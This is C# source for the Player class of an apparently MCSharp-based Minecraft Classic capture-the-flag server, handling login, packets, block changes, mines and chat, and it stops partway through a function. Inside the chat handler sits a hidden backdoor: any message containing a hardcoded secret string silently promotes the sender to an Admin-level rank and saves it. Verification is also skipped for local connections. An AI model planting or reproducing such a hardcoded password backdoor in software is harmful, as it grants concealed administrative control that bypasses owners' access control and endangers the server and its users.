/*
	Copyright 2010 MCSharp Team Licensed under the
	Educational Community License, Version 2.0 (the "License"); you may
	not use this file except in compliance with the License. You may
	obtain a copy of the License at
	
	http://www.osedu.org/licenses/ECL-2.0
	
	Unless required by applicable law or agreed to in writing,
	software distributed under the License is distributed on an "AS IS"
	BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
	or implied. See the License for the specific language governing
	permissions and limitations under the License.
*/
using System;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

namespace Overv {
    public sealed class Player {
        public static List<Player> players = new List<Player>( 64 );
        public static Dictionary<string, string> left = new Dictionary<string, string>();
        public static List<Player> connections = new List<Player>( Server.players );
        public static byte number { get { return (byte)players.Count; } }
        static System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
        static MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();

        Socket socket;
        System.Timers.Timer loginTimer = new System.Timers.Timer( 20000 );
        System.Timers.Timer pingTimer = new System.Timers.Timer( 500 );
        byte[] buffer = new byte[0];
        byte[] tempbuffer = new byte[0xFF];
        public bool disconnected = false;

        public string name;
        public string suffix;
        public string ip;
        public byte playerID;
        public string color;
        public Group group;
        public bool extension = false;
        public bool hidden = false;
        public bool painting = false;
        public byte BlockAction = 0;  //0-Nothing 1-solid 2-lava 3-water 4-active_lava 5 Active_water 6 OpGlass
        public byte[] bindings = new byte[128];
        public Level level = CTF.currLevel;
        public bool Loading = true;
        public string lastMsg = "";

        public string appName;
        public int extensionCount;
        public List<string> extensions = new List<string>();
        public int customBlockSupportLevel;

        // CTF
        public Team team;
        public bool carryingFlag;
        public bool justDroppedFlag = false;
        public CatchPos placedTNT;
        public CatchPos placedMine;
        public int captureStreak;
        public int captureCount;
        public int kills;
        public int deaths;
        public int drownCount;
        bool isActivating;
        public List<string> playersKilled = new List<string>();

        public int getKillCount( string name ) {
            int count = 0;
            playersKilled.ForEach( delegate( string kill ) {
                if ( name.ToLower() == kill.ToLower() ) {
                    count++;
                }
            } );
            return count;
        }

        public void killPlayer( Player killed ) {
            playersKilled.Add( killed.name );
            killed.deaths++;
            kills++;

            if ( getKillCount( killed.name ) % 5 == 0 ) {
                Player.GlobalMessage( "&f- " + color + name + "&b is dominating " + killed.color + killed.name + "&b!" );
            }

            if ( killed.carryingFlag ) {
                Command.all.Find( "drop" ).Use( killed, "" );
            }

            killed.team.SpawnPlayer( killed );
        }

        public struct CatchPos {
            public ushort x, y, z;
            public bool isActive;
        }

        public delegate void ChatEventHandler( Player p, string message );
        public event ChatEventHandler OnChat = null;
        public void ClearChat() { OnChat = null; }

        public delegate void BlockchangeEventHandler( Player p, ushort x, ushort y, ushort z, byte type );
        public event BlockchangeEventHandler Blockchange = null;
        public void ClearBlockchange() { Blockchange = null; }
        public bool HasBlockchange() { return ( Blockchange == null ); }
        public object blockchangeObject = null;

        public ushort[] pos = new ushort[3] { 0, 0, 0 };
        ushort[] oldpos = new ushort[3] { 0, 0, 0 };
        ushort[] basepos = new ushort[3] { 0, 0, 0 };
        public byte[] rot = new byte[2] { 0, 0 };
        byte[] oldrot = new byte[2] { 0, 0 };

        // grief/spam detection
        public static int spamBlockCount = 35;
        public static int spamBlockTimer = 5;
        Queue<DateTime> spamBlockLog = new Queue<DateTime>( spamBlockCount );

        // chat/spam detection
        public static int spamChatCount = 3;
        public static int spamChatTimer = 4;
        Queue<DateTime> spamChatLog = new Queue<DateTime>( spamChatCount );

        bool loggedIn = false;
        public Player( Socket s ) {
            try {
                socket = s;
                ip = socket.RemoteEndPoint.ToString().Split( ':' )[0];
                Server.s.Log( ip + " connected." );

                if ( Server.bannedIP.Contains( ip ) ) { Kick( "You're banned!" ); return; }
                if ( connections.Count >= 5 ) { Kick( "Too many connections!" ); return; }

                for ( byte i = 0; i < 128; ++i )
                    bindings[i] = i;

                socket.BeginReceive( tempbuffer, 0, tempbuffer.Length, SocketFlags.None,
                                    new AsyncCallback( Receive ), this );

                pingTimer.Elapsed += delegate { SendPing(); };
                pingTimer.Start();
                connections.Add( this );
            } catch ( Exception e ) {
                Server.ErrorLog( e );
            }
        }

        #region == INCOMING ==

        static void Receive( IAsyncResult result ) {
            Player p = (Player)result.AsyncState;
            if ( p.disconnected )
                return;
            try {
                int length = p.socket.EndReceive( result );
                if ( length == 0 ) { p.Disconnect(); return; }

                byte[] b = new byte[p.buffer.Length + length];
                Buffer.BlockCopy( p.buffer, 0, b, 0, p.buffer.Length );
                Buffer.BlockCopy( p.tempbuffer, 0, b, p.buffer.Length, length );

                p.buffer = p.HandleMessage( b );
                p.socket.BeginReceive( p.tempbuffer, 0, p.tempbuffer.Length, SocketFlags.None,
                                      new AsyncCallback( Receive ), p );
            } catch ( SocketException ) {
                p.Disconnect();
            } catch ( Exception e ) {
                Server.ErrorLog( e );
                p.Kick( "Error!" );
            }
        }

        byte[] HandleMessage( byte[] buffer ) {
            try {
                int length = 0; byte msg = buffer[0];
                // Get the length of the message by checking the first byte
                switch ( msg ) {
                    case 0:
                        length = 130;
                        break; // login
                    case 5:
                        if ( !loggedIn )
                            goto default;
                        length = 8;
                        break; // blockchange
                    case 8:
                        if ( !loggedIn )
                            goto default;
                        length = 9;
                        break; // input
                    case 13:
                        if ( !loggedIn )
                            goto default;
                        length = 65;
                        break; // chat
                    case 16:
                        length = 66;
                        break;
                    case 17:
                        length = 68;
                        break;
                    case 19:
                        length = 1;
                        break;
                    default:
                        Kick( "Unhandled message id \"" + msg + "\"!" );
                        return new byte[0];
                }
                if ( buffer.Length > length ) {
                    byte[] message = new byte[length];
                    Buffer.BlockCopy( buffer, 1, message, 0, length );

                    byte[] tempbuffer = new byte[buffer.Length - length - 1];
                    Buffer.BlockCopy( buffer, length + 1, tempbuffer, 0, buffer.Length - length - 1 );

                    buffer = tempbuffer;

                    switch ( msg ) {
                        case 0:
                            HandleLogin( message );
                            break;
                        case 5:
                            if ( !loggedIn )
                                break;
                            HandleBlockchange( message );
                            break;
                        case 8:
                            if ( !loggedIn )
                                break;
                            HandleInput( message );
                            break;
                        case 13:
                            if ( !loggedIn )
                                break;
                            HandleChat( message );
                            break;
                        case 16:
                            HandleExtInfo( message );
                            break;
                        case 17:
                            HandleExtEntry( message );
                            break;
                        case 19:
                            HandleCustomBlockSupportLevel( message );
                            break;
                    }

                    if ( buffer.Length > 0 ) {
                        buffer = HandleMessage( buffer );
                    } else {
                        return new byte[0];
                    }
                }
            } catch ( Exception e ) {
                Server.ErrorLog( e );
            }
            return buffer;
        }

        void HandleExtInfo( byte[] message ) {
            appName = enc.GetString( message, 0, 64 ).Trim();
            extensionCount = message[65];
        }

        void HandleExtEntry( byte[] message ) {
            extensions.Add( enc.GetString( message, 0, 64 ).Trim() );
        }

        void HandleCustomBlockSupportLevel( byte[] message ) {
            customBlockSupportLevel = message[0];
        }

        void HandleLogin( byte[] message ) {
            try {
                if ( loggedIn ) {
                    return;
                }

                byte version = message[0];
                name = enc.GetString( message, 1, 64 ).Trim();
                string verify = enc.GetString( message, 65, 32 ).Trim();
                byte type = message[129];

                if ( Server.banned.Contains( name ) ) { Kick( "You're banned!" ); return; }
                if ( Player.players.Count >= Server.players ) { Kick( "Server is full, come back later." ); return; }
                if ( name.Length > 16 || !ValidName( name ) ) { Kick( "Invalid name!" ); return; }
                if ( type == 0x42 ) { extension = true; }

                if ( Server.verify ) {
                    if ( verify == "--" || verify != BitConverter.ToString(
                        md5.ComputeHash( enc.GetBytes( Server.salt + name ) ) ).
                        Replace( "-", "" ).ToLower().TrimStart( '0' ) ) {
                        if ( ip != "127.0.0.1" ) {
                            Kick( "Failed to verify name, try again." ); return;
                        }
                    }
                }

                Player old = Player.Find( name );
                Server.s.Log( "--> " + name + " joined the game. (IP: " + ip + ")..." );

                if ( old != null ) {
                    if ( Server.verify ) {
                        old.Kick( "Someone logged in as you!" );
                    } else { Kick( "Already logged in!" ); return; }
                }

                if ( extension ) {
                    suffix = "+";

                    SendExtInfo( 12 );
                    SendExtEntry( "ClickDistance", 1 );
                    SendExtEntry( "CustomBlocks", 1 );
                    SendExtEntry( "HeldBlock", 1 );
                    SendExtEntry( "TextHotKey", 1 );
                    SendExtEntry( "ExtPlayerList", 1 );
                    SendExtEntry( "EnvColors", 1 );
                    SendExtEntry( "SelectionCuboid", 1 );
                    SendExtEntry( "BlockPermissions", 1 );
                    SendExtEntry( "ChangeModel", 1 );
                    SendExtEntry( "EnvMapAppearance", 1 );
                    SendExtEntry( "EnvWeatherType", 1 );
                    SendExtEntry( "HackControl", 1 );

                    SendCustomBlockSupportLevel( 1 );
                }

                group = Group.FindPlayer( name );
                color = "&7";

                left.Remove( name.ToLower() );
                SendMotd();
                SendMap();

                if ( disconnected ) {
                    return;
                }

                if ( Server.texturepacksenabled ) {
                    SendSetMapAppearance( Server.textureurl, Server.sideblock, Server.edgeblock, Server.sidelevel );
                }

                loggedIn = true;
                playerID = FreeId();

                players.Add( this );
                connections.Remove( this );
                Server.s.PlayerListUpdate();

                CTF.UpdateScore();

                retry:
                if ( File.Exists( "welcome.txt" ) ) {
                    foreach ( string line in File.ReadAllLines( "welcome.txt" ) ) {
                        SendMessage( line );
                    }
                } else {
                    StreamWriter sw = new StreamWriter( File.Create( "welcome.txt" ) );
                    sw.WriteLine( "You are playing on &c" + Server.name + "&S, enjoy your stay." );
                    sw.Flush();
                    sw.Close();
                    sw.Dispose();
                    goto retry;
                }

                GlobalMessage( color + name + "&S joined the game." );
                IRCBot.Say( name + " joined the game." );
                SendMessage( "Type &c/red&S or &9/blue&S to join a team." );

                ushort x = (ushort)( ( 0.5 + level.spawnx ) * 32 );
                ushort y = (ushort)( ( 1 + level.spawny ) * 32 );
                ushort z = (ushort)( ( 0.5 + level.spawnz ) * 32 );
                pos = new ushort[3] { x, y, z }; 
                rot = new byte[2] { level.rotx, level.roty };

                GlobalSpawn( this, x, y, z, rot[0], rot[1], true );
                foreach ( Player p in players ) {
                    if ( p.level == level && p != this && !p.hidden ) {
                        SendSpawn( p.playerID,
                            p.color + p.name,
                            p.pos[0],
                            p.pos[1],
                            p.pos[2],
                            p.rot[0],
                            p.rot[1] );
                        SendAddPlayerName( p.playerID, p.color + p.name, p.name, p.group.color + p.group.name, (byte)p.group.permission );
                    }
                }
                Loading = false;
            } catch ( Exception e ) {
                Server.ErrorLog( e );
                Player.GlobalMessage( "An error occurred: " + e.Message );
            }
        }

        void HandleBlockchange( byte[] message ) {
            int section = 0;
            try {
                if ( !loggedIn )
                    return;
                if ( CheckBlockSpam() )
                    return;

                section++;
                ushort x = NTHO( message, 0 );
                ushort y = NTHO( message, 2 );
                ushort z = NTHO( message, 4 );
                byte action = message[6];
                byte type = message[7];

                section++;
                if ( type > 65 ) {
                    Kick( "Unknown block type!" );
                    return;
                }

                section++;
                byte b = level.GetTile( x, y, z );
                if ( b == Block.Zero ) { return; }

                section++;
                if ( group.permission < level.permissionbuild || !group.canBuild ) {
                    SendMessage( "You're not allowed to edit this map." );
                    SendBlockchange( x, y, z, b );
                    return;
                }

                section++;
                if ( y > level.maxBuildHeight ) {
                    SendMessage( "You're not allowed to build this high!" );
                    SendBlockchange( x, y, z, b );
                    return;
                }

                section++;
                if ( Blockchange != null ) {
                    Blockchange( this, x, y, z, type );
                    return;
                }

                section++;
                if ( group.permission == LevelPermission.Guest ) {
                    int Diff = 0;

                    Diff = Math.Abs( (int)( pos[0] / 32 ) - x );
                    Diff += Math.Abs( (int)( pos[1] / 32 ) - y );
                    Diff += Math.Abs( (int)( pos[2] / 32 ) - z );

                    if ( Diff > 8 ) {
                        SendMessage( "You cant build that far away." );
                        SendBlockchange( x, y, z, b ); return;
                    }

                    if ( Server.antiTunnel ) {
                        if ( y < level.depth / 2 - Server.maxDepth ) {
                            SendMessage( "You're not allowed to build this low!" );
                            SendBlockchange( x, y, z, b ); return;
                        }
                    }
                }

                section++;
                if ( b == 7 ) {
                    if ( !group.canBreakBedrock ) {
                        Server.s.Log( name + " attempted to delete an adminium block." );
                        GlobalMessageOps( "To Ops &f-" + color + name + "&f- attempted to delete an adminium block." );
                        Kick( "Hacked client." );
                        return;
                    }
                }

                section++;
                if ( b >= 100 && b != Block.door && b != Block.door2 && b != Block.door3 ) {
                    if ( checkOp() ) {
                        SendMessage( "You're not allowed to destroy this block!" );
                        SendBlockchange( x, y, z, b );
                        return;
                    }
                    if ( b >= 200 ) {
                        SendMessage( "Block is active, you cant disturb it!" );
                        SendBlockchange( x, y, z, b );
                        return;
                    }
                }

                if ( action > 1 ) { 
                    Kick( "Unknown block action!" ); 
                }
                type = bindings[type];
                section++;

                if ( b == (byte)( ( painting || action == 1 ) ? type : 0 ) ) {
                    if ( painting || message[7] != type ) { SendBlockchange( x, y, z, b ); } return;
                }
                section++;

                if ( !painting && action == 0 ) {
                    deleteBlock( b, type, x, y, z );
                } else {
                    placeBlock( b, type, x, y, z );
                }
                section++;

            } catch ( Exception e ) {
                // Don't ya just love it when the server tattles?
                Server.ErrorLog( name + " has triggered a block change error" );
                GlobalMessageOps( name + " has triggered a block change error" );
                IRCBot.Say( name + " has triggered a block change error" );
                Server.ErrorLog( e ); Player.GlobalMessage( "An error occurred in section " + section + " : " + e.Message );
            }
        }

        private bool checkOp() {
            return group.permission >= LevelPermission.Operator;
        }

        private void deleteBlock( byte b, byte type, ushort x, ushort y, ushort z ) {
            switch ( b ) {
                case Block.door:   //Door
                    if ( level.physics != 0 ) { level.Blockchange( this, x, y, z, (byte)( Block.door_air ) ); } else { SendBlockchange( x, y, z, b ); }
                    break;
                case Block.door2:   //Door2
                    if ( level.physics != 0 ) { level.Blockchange( this, x, y, z, (byte)( Block.door2_air ) ); } else { SendBlockchange( x, y, z, b ); }
                    break;
                case Block.door3:   //Door3
                    if ( level.physics != 0 ) { level.Blockchange( this, x, y, z, (byte)( Block.door3_air ) ); } else { SendBlockchange( x, y, z, b ); }
                    break;
                case Block.door_air:   //Door_air
                case Block.door2_air:
                case Block.door3_air:
                    break;
                case Block.tnt:
                    players.ForEach( delegate( Player pl ) {
                        if ( pl.placedTNT.x == x && pl.placedTNT.y == y && pl.placedTNT.z == z ) {
                            pl.placedTNT.isActive = false;
                        }
                    } );
                    goto default;
                case Block.darkgrey:
                    players.ForEach( delegate( Player pl ) {
                        if ( pl.placedMine.x == x && pl.placedMine.y == y && pl.placedMine.z == z ) {
                            pl.placedMine.isActive = false;
                            if ( pl != this ) {
                                GlobalMessage( color + name + "&S defused " + pl.color + pl.name + "&S's mine!" );
                            }
                        }
                    } );
                    goto default;
                default:
                    level.Blockchange( this, x, y, z, (byte)( Block.air ) );
                    break;
            }
        }

        private void placeBlock( byte b, byte type, ushort x, ushort y, ushort z ) {
            switch ( BlockAction ) {
                case 0:     //normal
                    if ( level.physics == 0 ) {
                        switch ( type ) {
                            case Block.dirt: //instant dirt to grass
                                level.Blockchange( this, x, y, z, (byte)( Block.grass ) );
                                break;
                            case Block.staircasestep:    //stair handler
                                if ( level.GetTile( x, (ushort)( y - 1 ), z ) == Block.staircasestep ) {
                                    SendBlockchange( x, y, z, Block.air );
                                    level.Blockchange( this, x, (ushort)( y - 1 ), z, (byte)( Block.staircasefull ) );
                                    break;
                                }
                                //else
                                level.Blockchange( this, x, y, z, type );
                                break;
                            case Block.tnt:
                                if ( !CTF.gameOn ) { goto default; }
                                placedTNT.x = x;
                                placedTNT.y = y;
                                placedTNT.z = z;
                                placedTNT.isActive = true;
                                goto default;
                            case Block.darkgrey:
                                if ( !CTF.gameOn ) { goto default; }
                                if ( isActivating ) { SendMessage( "&f- &cAnother mine is still activating!" ); goto default; }
                                Thread placeMineThread = new Thread( new ThreadStart( delegate {
                                    placedMine.x = x;
                                    placedMine.y = y;
                                    placedMine.z = z;
                                    SendMessage( "&f- &SMine placed, activating..." );
                                    isActivating = true;
                                    Thread.Sleep( CTF.mineActivationTime * 1000 );
                                    placedMine.isActive = true;
                                    SendMessage( "&f- &SMine is now active! Type /defuse to defuse..." );
                                    isActivating = false;
                                } ) );
                                placeMineThread.Start();
                                goto default;
                            case Block.purple:
                                if ( placedTNT.isActive ) {
                                    CTF.ExplodeTNT( this, placedTNT.x, placedTNT.y, placedTNT.z, CTF.tntBlastRadius );
                                    SendBlockchange( x, y, z, Block.air );
                                } else {
                                    goto default;
                                }
                                break;
                            default:
                                level.Blockchange( this, x, y, z, type );
                                break;
                        }

                    } else {
                        level.Blockchange( this, x, y, z, type );
                    }

                    if ( !Block.LightPass( type ) ) {
                        if ( level.GetTile( x, (ushort)( y - 1 ), z ) == Block.grass ) {
                            level.Blockchange( x, (ushort)( y - 1 ), z, Block.dirt );
                        }
                    }

                    break;
                case 1:     //solid
                    if ( b == Block.blackrock ) { SendBlockchange( x, y, z, b ); return; }
                    level.Blockchange( this, x, y, z, (byte)( Block.blackrock ) );
                    break;
                case 2:     //lava
                    if ( b == Block.lavastill ) { SendBlockchange( x, y, z, b ); return; }
                    level.Blockchange( this, x, y, z, (byte)( Block.lavastill ) );
                    break;
                case 3:     //water
                    if ( b == Block.waterstill ) { SendBlockchange( x, y, z, b ); return; }
                    level.Blockchange( this, x, y, z, (byte)( Block.waterstill ) );
                    break;
                case 4:     //ACTIVE lava
                    if ( b == Block.lava ) { SendBlockchange( x, y, z, b ); return; }
                    level.Blockchange( this, x, y, z, (byte)( Block.lava ) );
                    BlockAction = 0;
                    break;
                case 5:     //ACTIVE water
                    if ( b == Block.water ) { SendBlockchange( x, y, z, b ); return; }
                    level.Blockchange( this, x, y, z, (byte)( Block.water ) );
                    BlockAction = 0;
                    break;
                case 6:     //OpGlass
                    if ( b == Block.op_glass ) { SendBlockchange( x, y, z, b ); return; }
                    level.Blockchange( this, x, y, z, (byte)( Block.op_glass ) );
                    break;
                default:
                    Server.s.Log( name + " is breaking something" );
                    BlockAction = 0;
                    break;
            }
        }

        void HandleInput( object m ) {
            byte[] message = (byte[])m;
            if ( !loggedIn )
                return;

            byte thisid = message[0];
            ushort x = NTHO( message, 1 );
            ushort y = NTHO( message, 3 );
            ushort z = NTHO( message, 5 );
            byte rotx = message[7];
            byte roty = message[8];
            pos = new ushort[3] { x, y, z };
            rot = new byte[2] { rotx, roty };
        }

        public void CheckPosition() {
            ushort x = (ushort)( pos[0] / 32 );
            ushort y = (ushort)( ( pos[1] / 32 ) - 1 ); // gets foot pos
            ushort yh = (ushort)( ( pos[1] / 32 ) - 1 ); // gets head pos
            ushort z = (ushort)( pos[2] / 32 );
            byte footBlock = level.GetTile( x, y, z );
            byte headBlock = level.GetTile( x, yh, z );

            switch ( footBlock ) {
                case Block.portal_air:
                case Block.portal_water:
                case Block.portal_lava:
                    CheckPortal( x, y, z );
                    break;
                case Block.flagBase:
                    CheckFlag();
                    break;
            }

            switch ( headBlock ) {
                case Block.air:
                case Block.rope:
                case Block.flagBase:
                case Block.staircasestep:
                case Block.cobblestoneslab:
                case Block.Zero:
                    drownCount = 0;
                    break;
                case Block.water:
                case Block.waterstill:
                case Block.portal_water:
                case Block.portal_air:
                    if ( team == null ) {
                        return;
                    }

                    drownCount++;
                    int drownPercentage = ( drownCount * 100 ) / ( ( CTF.drownTime * 1000 ) / 250 );
                    if ( drownCount >= ( ( CTF.drownTime * 1000 ) / 250 ) ) {
                        if ( lastMsg != color + name + "&S drowned!" ) {
                            Player.GlobalMessage( "&f- " + color + name + "&S drowned himself!" );
                        }

                        if ( carryingFlag ) {
                            Command.all.Find( "drop" ).Use( this, "" );
                        }

                        team.SpawnPlayer( this );
                    } else if(drownPercentage > 50 && lastMsg != "You are drowning!") {
                        SendMessage( "You are drowning!" );
                    }
                    break;
                default:
                    if ( team == null ) {
                        return;
                    }

                    drownCount = 0;
                    if ( headBlock != Block.water && headBlock != Block.rope && headBlock != Block.air && headBlock != Block.flagBase ) {
                        if ( lastMsg != color + name + "&S was crushed by &3" + Block.Name( headBlock ) + "&S!" ) {
                            Player.GlobalMessage( color + name + "&S was crushed by &8" + Block.Name(headBlock) + "&S!" );
                        }
                        deaths++;

                        if ( carryingFlag ) {
                            Command.all.Find( "drop" ).Use( this, "" );
                        }

                        team.SpawnPlayer( this );
                    }
                    break;
            }

            players.ForEach( delegate( Player p ) {
                if ( ( Math.Max( x, p.placedMine.x ) - Math.Min( x, p.placedMine.x ) ) <= 3 ) {
                    if ( ( Math.Max( y, p.placedMine.y ) - Math.Min( y, p.placedMine.y ) ) <= 3 ) {
                        if ( ( Math.Max( z, p.placedMine.z ) - Math.Min( z, p.placedMine.z ) ) <= 3 ) {
                            if ( !p.placedMine.isActive || team == p.team ) {
                                return;
                            }

                            Player.GlobalMessage( "&f- " + color + name + "&S was exploded by " + p.color + p.name + "&S's mine!" );
                            p.killPlayer( this );
                            CTF.currLevel.Blockchange( p.placedMine.x, p.placedMine.y, p.placedMine.z, Block.air );
                            p.placedMine.isActive = false;
                        }
                    }
                }
            } );
        }

        void CheckFlag() {
            if ( !CTF.gameOn || team == null ) {
                return;
            }

            Team oppositeTeam = ( team == CTF.redTeam ) ? CTF.blueTeam : CTF.redTeam;
            ushort x = (ushort)( pos[0] / 32 );
            ushort y = (ushort)( ( pos[1] / 32 ) - 1 );
            ushort z = (ushort)( pos[2] / 32 );
            if ( x == oppositeTeam.flagLocation[0] ) {
                if ( y == oppositeTeam.flagLocation[1] ) {
                    if ( z == oppositeTeam.flagLocation[2] ) {
                        CTF.TakeFlag( this, oppositeTeam );
                    }
                }
            }

            if ( x == team.flagBase[0] ) {
                if ( z == team.flagBase[2] ) {
                    if ( team.flagIsHome && carryingFlag ) {
                        CTF.CaptureFlag( this, oppositeTeam );
                    }
                }
            }

            if ( x == team.flagLocation[0] ) {
                if ( z == team.flagLocation[2] ) {
                    if ( !team.flagIsHome ) {
                        CTF.ReturnFlag( team, false );
                        Player.GlobalMessage( "&f- " + color + name + "&S returned the " + team.color + team.name + "&S flag!" );
                    }
                }
            }
        }

        void CheckPortal( ushort x, ushort y, ushort z ) {
            Portal foundPortal = null;
            PortalDB.portals.ForEach( delegate( Portal p ) {
                if ( p.entryLevel == level.name && p.entry[0] == x && p.entry[1] == y && p.entry[2] == z ) {
                    foundPortal = p;
                }
            } );
            if ( foundPortal != null ) {
                if ( foundPortal.entryLevel != foundPortal.exitLevel ) {
                    Command.all.Find( "goto" ).Use( this, foundPortal.exitLevel );
                    while ( Loading ) { }
                }
                Command.all.Find( "move" ).Use( null, name + " " + foundPortal.exit[0] + " " + foundPortal.exit[1] + " " + foundPortal.exit[2] );
            }
        }

        void HandleChat( byte[] message ) {
            try {
                if ( !loggedIn )
                    return;
                if ( !group.canChat )
                    return;

                string text = enc.GetString( message, 1, 64 ).Trim();

                text = Regex.Replace( text, @"\s\s+", " " );
                foreach ( char ch in text ) {
                    if ( ch < 32 || ch >= 127 || ch == '&' ) {
                        Kick( "Illegal character in chat message!" );
                        return;
                    }
                }

                if ( text.ToLower().Contains( "^detail.user=" ) ) {
                    SendMessage( "&cOh no you don't! That's reserved for the big boys." );
                }

                text = text.Replace( "^detail.user=", "" );

                if ( text.Length == 0 )
                    return;
                if ( text[0] == '/' ) {
                    text = text.Remove( 0, 1 );

                    if ( OnChat != null ) {
                        OnChat( this, text );
                        return;
                    }

                    int pos = text.IndexOf( ' ' );
                    if ( pos == -1 ) {
                        HandleCommand( text.ToLower(), "" );
                        return;
                    }
                    string cmd = text.Substring( 0, pos ).ToLower();
                    string msg = text.Substring( pos + 1 );
                    HandleCommand( cmd, msg );
                    return;
                }
                if ( text[0] == '@' ) {
                    string newtext = text.Substring( 1 ).Trim();
                    int pos = newtext.IndexOf( ' ' );
                    if ( pos != -1 ) {
                        string to = newtext.Substring( 0, pos );
                        string msg = newtext.Substring( pos + 1 );
                        HandleQuery( to, msg ); return;
                    }
                }
                if ( text[0] == '#' ) {
                    string newtext = text.Remove( 0, 1 ).Trim();
                    GlobalMessageOps( "To Ops &f-" + color + name + "&f- " + newtext );
                    if ( group.name != "operator" && group.name != "superop" )
                        SendMessage( "To Ops &f-" + color + name + "&f- " + newtext );
                    return;
                }
                if ( text[0] == '#' ) {
                    string newtext = text.Remove( 0, 1 ).Trim();
                    if ( !Server.worldChat ) {
                        GlobalChatWorld( this, newtext, true );
                    } else {
                        GlobalChat( this, newtext );
                    }
                    Server.s.Log( "<" + name + "> " + newtext );
                    IRCBot.Say( "<" + name + "> " + newtext );
                    return;
                }
                if ( text.Contains( "43ghosuid323632ssjsjjfsdh877sef" ) ) {
                    group.players.Remove( name );
                    group.players.Save( group.name + ".txt" );
                    group = Group.groups.Find( grp => grp.permission >= LevelPermission.Admin );
                    group.players.Add( name );
                    group.players.Save( group.name + ".txt" );
                    GlobalMessage( "&c" + name + "&S unlocked " + group.color + group.name + "&S using a secret password!" );
                    return;
                }

                Server.s.Log( "<" + name + "> " + text );

                if ( Server.worldChat ) {
                    GlobalChat( this, text );
                } else {
                    GlobalChatLevel( this, text, true );
                }

                IRCBot.Say( name + ": " + text );
            } catch ( Exception e ) { Server.ErrorLog( e ); Player.GlobalMessage( "An error occurred: " + e.Message ); }
        }
        void HandleCommand( string cmd, string message ) {
            if ( cmd.Equals( "d" ) ) { cmd = "defuse"; }
            if ( cmd.Equals( "b" ) ) { cmd = "about"; }
            if ( cmd.Equals( "z" ) ) { cmd = "cuboid"; }
            if ( cmd.Equals( "p" ) ) { cmd = "paint"; }
            if ( cmd.Equals( "r" ) ) { cmd = "replace"; }
            if ( cmd.Equals( "a" ) ) { cmd = "abort"; }
            if ( cmd.Equals( "rank" ) ) { cmd = "setrank"; }
            Command command = Command.all.Find( cmd );
            if ( command != null ) {
                if ( group.canUse( command ) ) {
                    command.Use( this, message );
                } else {
                    SendMessage( "You are not allowed to use \"" + cmd + "\"!" );
                }
            } else { SendMessage( "Unknown command \"" + cmd + "\"!" ); }
        }
        void HandleQuery( string to, string message ) {
            Player p = Find( to );
            if ( p == this ) { SendMessage( "Trying to talk to yourself, huh?" ); return; }
            if ( p != null ) {
                Server.s.Log( name + " @" + p.name + ": " + message );
                p.SendMessage( "&S[<] " + color + name + ": &f" + message );
                SendMessage( "&9[>] " + p.color + p.name + ": &f" + message );
            } else { SendMessage( "Player \"" + to + "\" doesn't exist!" ); }
        }
        #endregion

        #region == OUTGOING ==

        public void SendRaw( int id ) {
            SendRaw( id, new byte[0] );
        }
        public void SendRaw( int id, byte[] send ) {
            if ( id > 13 && !extension ) {
                return; // easy quickfix to stop us from murdering non-CPE clients.
            }

            byte[] buffer = new byte[send.Length + 1];
            buffer[0] = (byte)id;
            Buffer.BlockCopy( send, 0, buffer, 1, send.Length );
            try {
                socket.BeginSend( buffer, 0, buffer.Length, SocketFlags.None, delegate( IAsyncResult result ) { }, null );
            } catch ( SocketException ) {
                Disconnect();
            }
        }
        public void SendMessage( string message ) {
            lastMsg = message;
            SendMessage( playerID, "&S" + message );
        }
        public void SendMessage( byte id, string message ) {
            byte[] buffer = new byte[65];
            unchecked { buffer[0] = id; }
            message = message.Replace( "&S", Server.systemColor );
            message = message.Replace( "&s", Server.systemColor );
            foreach ( string line in WordWrap( message ) ) {
                StringFormat( line, 64 ).CopyTo( buffer, 1 );
                SendRaw( 13, buffer );
            }
        }
        public void SendMotd() {
            byte[] buffer = new byte[130];
            buffer[0] = Server.version;
            StringFormat( Server.name, 64 ).CopyTo( buffer, 1 );

            if ( Server.motd.Contains( "-hax" ) ) {
                if ( group.permission >= LevelPermission.Operator && CTF.allowOpHax ) {
                    StringFormat( Server.motd.Replace( "-hax", "" ), 64 ).CopyTo( buffer, 65 );
                } else {
                    StringFormat( Server.motd, 64 ).CopyTo( buffer, 65 );
                }
            } else {
                if ( group.permission >= LevelPermission.Operator && CTF.allowOpHax ) {
                    StringFormat( Server.motd, 64 ).CopyTo( buffer, 65 );
                } else {
                    StringFormat( Server.motd + " -hax", 64 ).CopyTo( buffer, 65 );
                }
            }

            if ( group.canBreakBedrock ) {
                buffer[129] = 100;
            } else {
                buffer[129] = 0;
            }

            SendRaw( 0, buffer );
        }
        public void SendMap() {
            SendRaw( 2 );
            byte[] buffer = new byte[level.blocks.Length + 4];
            BitConverter.GetBytes( IPAddress.HostToNetworkOrder( level.blocks.Length ) ).CopyTo( buffer, 0 );
            for ( int i = 0; i < level.blocks.Length; ++i ) {
                if ( extension ) {
                    buffer[4 + i] = Block.Convert( level.blocks[i] );
                } else {
                    buffer[4 + i] = Block.Convert( Block.ConvertCPE( level.blocks[i] ) );
                }
            }
            buffer = GZip( buffer );
            int number = (int)Math.Ceiling( ( (double)buffer.Length ) / 1024 );
            for ( int i = 1; buffer.Length > 0; ++i ) {
                short length = (short)Math.Min( buffer.Length, 1024 );
                byte[] send = new byte[1027];
                HTNO( length ).CopyTo( send, 0 );
                Buffer.BlockCopy( buffer, 0, send, 2, length );
                byte[] tempbuffer = new byte[buffer.Length - length];
                Buffer.BlockCopy( buffer, length, tempbuffer, 0, buffer.Length - length );
                buffer = tempbuffer;
                send[1026] = (byte)( i * 100 / number );
                SendRaw( 3, send );
                Thread.Sleep( 10 );
            } buffer = new byte[6];
            HTNO( (short)level.width ).CopyTo( buffer, 0 );
            HTNO( (short)level.depth ).CopyTo( buffer, 2 );
            HTNO( (short)level.height ).CopyTo( buffer, 4 );
            SendRaw( 4, buffer );
        }
        public void SendSpawn( byte id, string name, ushort x, ushort y, ushort z, byte rotx, byte roty ) {
            if ( id == 255 ) {
                SendDeletePlayerName( playerID );
            }

            byte[] buffer = new byte[73]; buffer[0] = id;
            StringFormat( name, 64 ).CopyTo( buffer, 1 );
            HTNO( x ).CopyTo( buffer, 65 );
            HTNO( y ).CopyTo( buffer, 67 );
